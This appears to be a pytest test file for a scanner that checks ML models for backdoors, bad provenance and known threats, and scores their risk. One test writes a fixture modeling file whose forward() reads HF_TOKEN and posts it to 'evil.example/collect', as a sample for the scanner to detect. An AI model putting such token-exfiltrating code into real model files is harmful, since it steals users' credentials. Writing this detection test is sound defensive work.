"""
Tests for ModelScanner and ScanResult.

Coverage:
- ScanResult.to_report() and to_json() produce correct output.
- ModelScanner.scan() orchestrates checks correctly.
- Threat DB hit triggers short-circuit with risk_score=1.0.
- Provenance failures contribute to risk score.
- Empty model_id raises ValueError.
- Risk score computation formula is correct.
- Safe/unsafe threshold respected.
"""

from __future__ import annotations

import json
from unittest.mock import MagicMock, patch

import pytest

from modelsafe.scanner import ModelScanner, ScanResult, _RISK_THRESHOLD
from modelsafe.threat_db import ThreatDatabase


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------


@pytest.fixture
def clean_scan_result() -> ScanResult:
    return ScanResult(
        model_id="test/model",
        safe=True,
        risk_score=0.10,
        findings=[
            {"check": "provenance", "result": "PASS", "severity": "info", "detail": "OK"}
        ],
        provenance_verified=True,
        weight_anomaly_score=0.05,
        activation_anomaly_score=0.08,
        scan_duration_s=1.23,
        timestamp="2026-03-23T12:00:00Z",
        threat_db_hit=False,
        threat_record=None,
    )


@pytest.fixture
def malicious_scan_result() -> ScanResult:
    return ScanResult(
        model_id="evil/backdoored",
        safe=False,
        risk_score=1.0,
        findings=[
            {
                "check": "threat_db",
                "result": "FAIL",
                "severity": "critical",
                "detail": "Known backdoor (ML-2024-001)",
            }
        ],
        provenance_verified=False,
        weight_anomaly_score=1.0,
        activation_anomaly_score=1.0,
        scan_duration_s=0.05,
        timestamp="2026-03-23T12:00:00Z",
        threat_db_hit=True,
        threat_record={
            "cve_id": "ML-2024-001",
            "threat_type": "backdoor",
            "effect": "exfiltrates env vars",
        },
    )


# ---------------------------------------------------------------------------
# ScanResult
# ---------------------------------------------------------------------------


class TestScanResult:
    def test_to_report_contains_model_id(
        self, clean_scan_result: ScanResult
    ) -> None:
        report = clean_scan_result.to_report()
        assert "test/model" in report

    def test_to_report_safe_contains_safe(
        self, clean_scan_result: ScanResult
    ) -> None:
        assert "SAFE" in clean_scan_result.to_report()

    def test_to_report_malicious_contains_unsafe(
        self, malicious_scan_result: ScanResult
    ) -> None:
        assert "UNSAFE" in malicious_scan_result.to_report()

    def test_to_report_threat_db_hit_shows_cve(
        self, malicious_scan_result: ScanResult
    ) -> None:
        report = malicious_scan_result.to_report()
        assert "ML-2024-001" in report

    def test_to_json_is_valid_json(self, clean_scan_result: ScanResult) -> None:
        data = json.loads(clean_scan_result.to_json())
        assert data["model_id"] == "test/model"
        assert data["safe"] is True

    def test_to_json_contains_all_keys(self, clean_scan_result: ScanResult) -> None:
        data = json.loads(clean_scan_result.to_json())
        required = {
            "model_id",
            "safe",
            "risk_score",
            "findings",
            "provenance_verified",
            "weight_anomaly_score",
            "activation_anomaly_score",
            "scan_duration_s",
            "timestamp",
            "threat_db_hit",
        }
        assert required.issubset(set(data.keys()))

    def test_to_json_risk_score_rounded(
        self, clean_scan_result: ScanResult
    ) -> None:
        data = json.loads(clean_scan_result.to_json())
        assert isinstance(data["risk_score"], float)

    def test_safe_true_when_below_threshold(self) -> None:
        result = ScanResult(
            model_id="test/model",
            safe=True,
            risk_score=0.3,
            findings=[],
            provenance_verified=True,
            weight_anomaly_score=0.0,
            activation_anomaly_score=0.0,
            scan_duration_s=0.1,
            timestamp="",
        )
        assert result.safe is True

    def test_to_report_shows_findings(
        self, malicious_scan_result: ScanResult
    ) -> None:
        report = malicious_scan_result.to_report()
        assert "threat_db" in report.lower() or "known" in report.lower()


# ---------------------------------------------------------------------------
# ModelScanner.scan() orchestration
# ---------------------------------------------------------------------------


class TestModelScannerOrchestration:
    def _build_scanner(
        self,
        prov_check_return: dict | None = None,
        threat_id_match: list | None = None,
    ) -> ModelScanner:
        mock_db = MagicMock(spec=ThreatDatabase)
        mock_db.check_model_id.return_value = threat_id_match or []
        mock_db.check_hash.return_value = None

        scanner = ModelScanner(
            threat_db=mock_db,
            skip_activation_scan=True,  # no torch needed in unit tests
        )

        # Patch provenance checker
        mock_prov = MagicMock()
        mock_prov.check.return_value = prov_check_return or {
            "verified": True,
            "risk_factors": [],
            "author": "test-author",
            "downloads": 1000,
            "has_model_card": True,
            "architecture_match": True,
            "last_modified": "2025-01-01T00:00:00Z",
        }
        scanner.provenance_checker = mock_prov

        return scanner

    def test_empty_model_id_raises(self) -> None:
        scanner = ModelScanner(skip_activation_scan=True)
        with pytest.raises(ValueError, match="non-empty"):
            scanner.scan("")

    def test_returns_scan_result_type(self) -> None:
        scanner = self._build_scanner()
        result = scanner.scan("test/model")
        assert isinstance(result, ScanResult)

    def test_clean_model_is_safe(self) -> None:
        scanner = self._build_scanner()
        result = scanner.scan("test/clean-model")
        # No local_path → weight/activation scores = 0.0
        # Provenance passes → prov_score = 0.0
        # risk = 0.0*0.3 + 0.0*0.4 + 0.0*0.3 = 0.0
        assert result.safe is True
        assert result.risk_score < _RISK_THRESHOLD

    def test_threat_db_hit_short_circuits_with_risk_1(self) -> None:
        threat_record = {
            "hash": "abc123",
            "model_id": "evil/backdoored",
            "threat_type": "backdoor",
            "cve_id": "ML-2024-001",
            "effect": "exfiltrates data",
        }
        scanner = self._build_scanner(threat_id_match=[threat_record])
        result = scanner.scan("evil/backdoored")

        assert result.threat_db_hit is True
        assert result.risk_score == 1.0
        assert result.safe is False

    def test_threat_db_hit_has_critical_finding(self) -> None:
        threat_record = {
            "model_id": "evil/backdoored",
            "threat_type": "backdoor",
            "cve_id": "ML-2024-001",
            "effect": "malicious",
        }
        scanner = self._build_scanner(threat_id_match=[threat_record])
        result = scanner.scan("evil/backdoored")

        critical_findings = [f for f in result.findings if f["severity"] == "critical"]
        assert len(critical_findings) >= 1

    def test_provenance_failure_raises_risk_score(self) -> None:
        scanner = self._build_scanner(
            prov_check_return={
                "verified": False,
                "risk_factors": [
                    "No model card.",
                    "New account.",
                    "Zero other models.",
                    "High downloads, no card.",
                ],
                "author": "suspect",
                "downloads": 50000,
                "has_model_card": False,
                "architecture_match": True,
                "last_modified": "",
            }
        )
        result = scanner.scan("suspect/model")
        # 4 risk factors × 0.25 = 1.0 prov_score → risk ≥ 0.3
        assert result.risk_score >= 0.3
        assert result.provenance_verified is False

    def test_result_has_timestamp(self) -> None:
        scanner = self._build_scanner()
        result = scanner.scan("test/model")
        assert result.timestamp.endswith("Z")

    def test_detects_supply_chain_code_backdoor(self, tmp_path) -> None:
        model_dir = tmp_path / "model"
        model_dir.mkdir()
        (model_dir / "modeling_backdoored.py").write_text(
            "import os\n"
            "import requests\n"
            "def forward(x):\n"
            "    token = os.environ.get('HF_TOKEN')\n"
            "    requests.post('https://evil.example/collect', json={'t': token})\n"
            "    return x\n"
        )

        scanner = self._build_scanner()
        result = scanner.scan("test/backdoored", local_path=str(model_dir))

        findings = [
            f for f in result.findings
            if f["check"] == "supply_chain_code_backdoor"
        ]
        assert len(findings) == 1
        assert findings[0]["severity"] == "critical"
        assert result.safe is False

    def test_result_has_positive_duration(self) -> None:
        scanner = self._build_scanner()
        result = scanner.scan("test/model")
        assert result.scan_duration_s >= 0.0

    def test_no_local_path_skips_weight_analysis(self) -> None:
        scanner = self._build_scanner()
        result = scanner.scan("test/model")
        # Without local_path, weight score should be 0
        assert result.weight_anomaly_score == 0.0

    def test_provenance_check_error_handled_gracefully(self) -> None:
        """ProvenanceCheckError should not crash the scan."""
        mock_db = MagicMock(spec=ThreatDatabase)
        mock_db.check_model_id.return_value = []
        scanner = ModelScanner(threat_db=mock_db, skip_activation_scan=True)

        from modelsafe.provenance import ProvenanceCheckError
        mock_prov = MagicMock()
        mock_prov.check.side_effect = ProvenanceCheckError("network timeout")
        scanner.provenance_checker = mock_prov

        result = scanner.scan("test/model")
        assert isinstance(result, ScanResult)
        # Should have an error finding but not crash
        error_findings = [f for f in result.findings if f["result"] == "ERROR"]
        assert len(error_findings) >= 1


# ---------------------------------------------------------------------------
# Risk score computation
# ---------------------------------------------------------------------------


class TestRiskScoreComputation:
    def test_all_zero_gives_zero(self) -> None:
        from modelsafe.scanner import ModelScanner
        score = ModelScanner._compute_risk_score(0.0, 0.0, 0.0)
        assert score == pytest.approx(0.0)

    def test_all_one_gives_one(self) -> None:
        score = ModelScanner._compute_risk_score(1.0, 1.0, 1.0)
        assert score == pytest.approx(1.0)

    def test_weighted_combination(self) -> None:
        # prov=1.0 (weight 0.3), weights=0.0 (weight 0.4), activation=0.0 (weight 0.3)
        score = ModelScanner._compute_risk_score(1.0, 0.0, 0.0)
        assert score == pytest.approx(0.30, rel=1e-6)

    def test_scores_clamped_to_unit_interval(self) -> None:
        # Even if inputs are > 1.0, output should be clamped
        score = ModelScanner._compute_risk_score(2.0, 2.0, 2.0)
        assert score <= 1.0
        score2 = ModelScanner._compute_risk_score(-1.0, -1.0, -1.0)
        assert score2 >= 0.0


# ---------------------------------------------------------------------------
# ThreatDatabase integration in scanner
# ---------------------------------------------------------------------------


class TestThreatDatabaseIntegration:
    def test_scanner_uses_default_threat_db_if_none(self) -> None:
        """Verify scanner instantiates ThreatDatabase if none provided."""
        scanner = ModelScanner(skip_activation_scan=True)
        assert isinstance(scanner.threat_db, ThreatDatabase)

    def test_scanner_accepts_custom_threat_db(self) -> None:
        custom_db = ThreatDatabase()
        scanner = ModelScanner(threat_db=custom_db, skip_activation_scan=True)
        assert scanner.threat_db is custom_db
